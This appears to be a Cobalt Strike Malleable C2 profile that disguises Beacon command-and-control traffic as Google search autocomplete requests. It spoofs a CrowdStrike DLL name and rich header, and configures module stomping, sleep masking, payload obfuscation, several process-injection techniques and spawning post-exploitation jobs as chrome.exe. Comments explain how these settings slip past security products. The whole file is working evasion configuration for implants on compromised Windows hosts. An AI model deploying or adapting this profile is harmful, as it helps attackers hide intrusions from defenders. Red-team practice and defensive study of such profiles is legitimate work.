########################
#
# Google Profile
#
#
########################

set sample_name "Google profile";

set sleeptime "60000"; # 1 Minute
#set sleeptime "300000"; # 5 Minutes
#set sleeptime "600000"; # 10 Minutes
#set sleeptime "3600000"; # 60 Minutes

set jitter "21"; #% jitter

#Google Chrome
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";

#Firefox
#set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0";

# IE 11
#set useragent "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";

# DNS
set dns_idle	"8.8.8.8"; # default is 0.0.0.0 which is a well-known indicator
set maxdns	"235";
set dns_stager_prepend	".info.4738.";

# SMB pipe settings
set pipename	"f4c3##";# https-certificate {
# 	set keystore "";
#	set password "";
# }
set pipename_stager	"f53f##";

#set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
#set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pip

# https-certificate {
#
#	#set keystore "/pathtokeystore";
#	#set password "password";
#
#	set C "US";
#	set L "Mountain View";
#	set ST "CA";
#	set CN "www.google.com";
#	set OU "Google";
#	set O "Google LLC";
# }

# code-signer {
#    set keystore "keystore.jks";
#    set password "password";
#    set alias "server";
#}

http-get {
	set uri "/complete/search";

	client {

		header "Host" "www.google.com";
		header "Accept" "*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";

		metadata {
			base64url;
			parameter "psi";
		}

		parameter "q" "top%2019%20vacations%20in%20us";
		parameter "cp" "22";
		parameter "authuser" "0";

	}

	server {
		header "Cache-Control" "private, max-age=3600";
		header "Content-Type" "application/json; charset=UTF-8";
		header "Server" "gws";
		header "Connection" "close";

		output {
			prepend ".....";
			base64url;
			print;
		}
	}
}

http-post {
	set uri "/Complete/search";
	set verb "GET";

	client {
		header "Host" "www.google.com";
		header "Accept" "*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";

		output {
			base64url;
			parameter "psi";
		}

		parameter "q" "top%2019%20vacations%20in%20us";
		parameter "cp" "22";
		parameter "authuser" "0";

		id {
			base64url;
			parameter "client";
		}
	}
	server {
		header "Cache-Control" "private, max-age=3600";
		header "Content-Type" "application/json; charset=UTF-8";
		header "Server" "gws";
		header "Connection" "close";

		output {
			prepend ".....";
			append "-------";
			base64url;
			print;
		}
	}
}

http-stager {

	client {
		header "Host" "www.google.com";
		header "Accept" "*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
	}

	server {
		header "Cache-Control" "private, max-age=3600";
		header "Content-Type" "application/json; charset=UTF-8";
		header "Server" "gws";
		header "Connection" "close";
	}
}

stage {
	set checksum       "0";
	set compile_time   "25 Oct 2019 13:10:50";
	set entry_point    "8800";
	set name           "CSCOMUtils.dll";  #CrowdStrike DLL
	set rich_header    "\xbd\xa1\x57\x94\xf9\xc0\x39\xc7\xf9\xc0\x39\xc7\xf9\xc0\x39\xc7\x9c\xa6\x3a\xc6\xfc\xc0\x39\xc7\x9c\xa6\x3c\xc6\x7a\xc0\x39\xc7\xab\xa8\x3a\xc6\xf1\xc0\x39\xc7\xab\xa8\x3c\xc6\xd8\xc0\x39\xc7\xab\xa8\x3d\xc6\xf7\xc0\x39\xc7\x95\xa8\x30\xc6\xfc\xc0\x39\xc7\x9c\xa6\x3d\xc6\xf4\xc0\x39\xc7\x9c\xa6\x38\xc6\xf0\xc0\x39\xc7\xf9\xc0\x38\xc7\x97\xc0\x39\xc7\x95\xa8\x39\xc6\xf8\xc0\x39\xc7\x95\xa8\xc6\xc7\xf8\xc0\x39\xc7\x95\xa8\x3b\xc6\xf8\xc0\x39\xc7\x52\x69\x63\x68\xf9\xc0\x39\xc7\x00\x00\x00\x00\x00\x00\x00\x00";

	#set name "cylance.dll";
	set userwx "false";
	set obfuscate "true"; # set stomppe "true" to lightly obfuscate, set stomppe "false" for no obfuscation
	set cleanup "true";	# removes self-bootstrapping blob for beacon via VirtualFree
	set sleep_mask "true";

	#set image_size_x86 "512000"; # size in bytes for where beacon lives
    #set image_size_x64 "512000"; # size in bytes for where beacon live

	# adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load specified DLL into the current process and overwrite its memory.
	set module_x64 "netshell.dll"; # 2,875,904 bytes
    set module_x86 "netshell.dll";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "ama";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.dll" "";
		append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	}

	transform-x64 {
		prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "ama";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.x64x.dll" "";
		append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	}
}

process-inject {
    # set remote memory allocation technique
    set allocator "NtMapViewOfSection"; # either VirtualAllocEx (default; cross-arch) or NtMapViewOfSection (same arch)
 
    # shape the content and properties of what we will inject
    set min_alloc "16384"; # minimum size of the block Beacon will allocate in a remote process
    set userwx    "false"; # avoid rwx memory pages
    set startrwx "false"; # avoid rwx memory pages
 
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
 
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
 
    # specify how we execute code in the remote process
    execute {
        CreateThread "ntdll!RtlUserThreadStart"; # self-injection; spawns a suspended thread that points to the RtlUserThreadStart function
        CreateThread; # self-injection; spins up a thread pointing to the code you want Beacon to run
        SetThreadContext; # works on x86 -> x86, x64 -> x64, and x64 -> x86; thread will have a start address that reflects the original execution entry point of the temporary process
        NtQueueApcThread-s; # only x86 -> x86 and x64 -> x64; supposedly allows our injected capability to initialize itself in the process before some userland-resident security products initialize themselves
        NtQueueApcThread; # only x86 -> x86 and x64 -> x64; target an existing remote process; pushes an RWX stub containing code and injection-related context to the remote process
        CreateRemoteThread;
        RtlCreateUserThread; #  inject code across session boundaries; fires Sysmon event 8
    }
}

post-ex {
	# Larger Cobalt Strike post-exploitation features (e.g.screenshot, keylogger, hashdump, mimikatz, portscan) are implemented as Windows DLLs. 

	# control the temporary process we spawn to; for keylogger <- find exec that works with user input and ideally that connects to internet in syswow64, sysnative dir
	#set spawnto_x86 "%windir%\\syswow64\\gpresult.exe"; 
	#set spawnto_x64 "%windir%\\sysnative\\gpresult.exe";

	#set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
	#set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";

	set spawnto_x86 "%windir%\\syswow64\\FlashPlayerApp.exe";
	set spawnto_x64 "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";

	#set spawnto_x86 "C:\\Program Files (x86)\\Microsoft Office\\Office16\\excelcnv.exe";
	#set spawnto_x64 "C:\\Program Files\\Mozilla Firefox\\firefox.exe";

	# scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way.
	set obfuscate "true";

	# pass key function pointers from Beacon to its child jobs
	set smartinject "true";

	# disable AMSI in powerpick, execute-assembly, and psinject
	set amsi_disable "false"; # crashes temporary post-ex processes for latest win 10 
}
